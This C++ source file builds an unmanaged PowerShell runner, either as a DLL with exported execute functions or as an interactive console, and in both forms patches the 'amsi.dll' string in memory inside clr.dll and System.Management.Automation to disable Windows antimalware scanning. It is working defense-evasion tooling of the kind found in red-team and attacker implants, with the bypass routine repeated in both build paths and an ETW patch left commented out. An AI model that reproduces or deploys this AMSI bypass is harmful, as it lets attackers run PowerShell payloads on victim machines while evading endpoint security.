#include "powershell.h"
#include "patch.h"
#include "clr.h"
#include <string>
#include <mutex>


#ifdef _WINDLL
BOOL APIENTRY DllMain(
	HMODULE hModule,
	DWORD   ul_reason_for_call,
	LPVOID  lpReserved
) {
	switch (ul_reason_for_call) {
	case DLL_PROCESS_ATTACH:
		break;
	case DLL_PROCESS_DETACH:
		break;

	default:
		break;
	}

	return TRUE;
}

#define PSH_OK              0
#define PSH_ERR_INIT       -1
#define PSH_ERR_RUNSPACE   -2
#define PSH_ERR_NOT_INIT   -3
#define PSH_ERR_INVALID    -4

static std::mutex g_mutex;
static CLR* g_clr = nullptr;
static RunspaceContext* g_ctx = nullptr;
static std::wstring g_lastError;

static void PSH_SetLastError(const std::wstring& msg) {
    std::lock_guard<std::mutex> lock(g_mutex);
    g_lastError = msg;
}

extern "C" __declspec(dllexport) BOOL PS_Init() {
    std::lock_guard<std::mutex> lock(g_mutex);

    if (g_clr != nullptr) {
        return TRUE;
    }

    g_clr = new CLR();
    if (!g_clr->InitCLR()) {
        PSH_SetLastError(L"Failed to init CLR");
        delete g_clr;
        g_clr = nullptr;
        return FALSE;
    }

    PVOID lpClrAddr = GetModuleHandleA("clr.dll");
    if (!lpClrAddr) {
        PRINT_ERROR("GetModuleHandleA");
        return 0;
    }

    wchar_t patchAmsi = L'H';
    LPVOID addrAmsi = (LPVOID)FindFirstStringW((uintptr_t)lpClrAddr, 0x9A0000, L"amsi.dll");
    if (addrAmsi) {
        DEBUG("Patch string amsi dll");
        PatchProcedure(addrAmsi, (BYTE*)&patchAmsi, sizeof(char));
    }

    g_ctx = new RunspaceContext();
    if (!InitRunspace(*g_clr, g_ctx)) {
        PSH_SetLastError(L"Failed to initialize runspace");
        delete g_ctx;
        g_ctx = nullptr;
        g_clr->FreeCLR();
        delete g_clr;
        g_clr = nullptr;
        return FALSE;
    }

    Patch(*g_clr);

    PVOID lpAutoAddr = GetModuleHandleA("System.Management.Automation.ni.dll");
    if (!lpAutoAddr) {
        PRINT_ERROR("GetModuleHandleA");
        return 0;
    }

    while (true)
    {
        char patchAmsi = 'H';

        LPVOID addrAmsi = (LPVOID)FindFirstString(
            (uintptr_t)lpAutoAddr,
            0x1FF0000,
            "amsi.dll"
        );

        if (!addrAmsi)
            break;

        PatchProcedure(
            addrAmsi,
            (BYTE*)&patchAmsi,
            sizeof(patchAmsi)
        );
    }

    return TRUE;
}

extern "C" __declspec(dllexport) BOOL PS_IsInitialized() {
    std::lock_guard<std::mutex> lock(g_mutex);
    return (g_clr != nullptr && g_ctx != nullptr) ? TRUE : FALSE;
}

extern "C" __declspec(dllexport) BSTR PS_Execute(LPCWSTR command) {
    std::lock_guard<std::mutex> lock(g_mutex);

    if (g_clr == nullptr || g_ctx == nullptr) {
        PSH_SetLastError(L"PS_Execute called before PS_Init");
        return SysAllocString(L"[!] not initialized - call PS_Init first");
    }

    if (command == nullptr) {
        return SysAllocString(L"");
    }

    std::wstring cmd(command);
    if (cmd == L"exit" || cmd == L"quit") {
        return SysAllocString(L"");
    }

    std::wstring out;
    if (!InvokeInRunspace(*g_clr, g_ctx, cmd, &out)) {
        PSH_SetLastError(L"InvokeInRunspace failed");
    }

    return SysAllocString(out.c_str());
}

extern "C" __declspec(dllexport) void PS_Shutdown() {
    std::lock_guard<std::mutex> lock(g_mutex);

    if (g_ctx != nullptr) {
        CloseRunspace(g_ctx);
        delete g_ctx;
        g_ctx = nullptr;
    }

    if (g_clr != nullptr) {
        g_clr->FreeCLR();
        delete g_clr;
        g_clr = nullptr;
    }

    g_lastError.clear();
}

extern "C" __declspec(dllexport) const wchar_t* PS_GetLastError() {
    return g_lastError.c_str();
}



#else
#include "hwbp_veh.h"

#include <Windows.h>
#include <cstdint>
#include <cstring>

int main() {
	std::wstring input;

	// Fix: Enable sync between C++ streams and C stdio
	std::ios_base::sync_with_stdio(true);
	std::wcout << std::flush;
	std::cout << std::flush;

	CLR clr;

	if (!clr.InitCLR()) {
		wprintf(L"[!] Failed to init CLR.\n");
		return 0;
	}


    PVOID lpClrAddr = GetModuleHandleA("clr.dll");
    if (!lpClrAddr) {
        PRINT_ERROR("GetModuleHandleA");
        return 0;
    }

    wchar_t patchAmsi = L'H';
    LPVOID addrAmsi = (LPVOID)FindFirstStringW((uintptr_t)lpClrAddr, 0x9A0000, L"amsi.dll");
    if (addrAmsi) {
        DEBUG("Patch string amsi dll");
        PatchProcedure(addrAmsi, (BYTE*)&patchAmsi, sizeof(char));
    }

	// Initialize runspace ONCE at startup
	RunspaceContext ctx;
	if (!InitRunspace(clr, &ctx)) {
		wprintf(L"[!] Failed to initialize runspace\n");
		return 0;
	}

    PVOID lpAutoAddr = GetModuleHandleA("System.Management.Automation.ni.dll");
    if (!lpAutoAddr) {
        PRINT_ERROR("GetModuleHandleA");
        return 0;
    }

    while (true)
    {
        char patchAmsi = 'H';

        LPVOID addrAmsi = (LPVOID)FindFirstString(
            (uintptr_t)lpAutoAddr,
            0x1FF0000,
            "amsi.dll"
        );

        if (!addrAmsi)
            break;

        DEBUG("Found string amsi.dll");
        printf("%p\n", addrAmsi);

        PatchProcedure(
            addrAmsi,
            (BYTE*)&patchAmsi,
            sizeof(patchAmsi)
        );
    }
    //PatchEtw();
	// Interactive loop - runspace stays open
	while (1) {
		std::cout << "PS > " << std::flush;
		std::getline(std::wcin, input);

		// Exit on "exit" command
		if (input == L"exit" || input == L"quit") {
			break;
		}

		std::wstring out;
		InvokeInRunspace(clr, &ctx, input, &out);

		// Convert wstring to string using WideCharToMultiByte
		if (!out.empty()) {
			int size_needed = WideCharToMultiByte(CP_ACP, 0, out.c_str(), -1, NULL, 0, NULL, NULL);
			if (size_needed > 0) {
				std::string out_str(size_needed - 1, '\0');
				WideCharToMultiByte(CP_ACP, 0, out.c_str(), -1, &out_str[0], size_needed, NULL, NULL);
				std::cout << out_str << std::endl;
			}
		}
	}

	// Close runspace when exiting
	CloseRunspace(&ctx);

	return 0;
}

#endif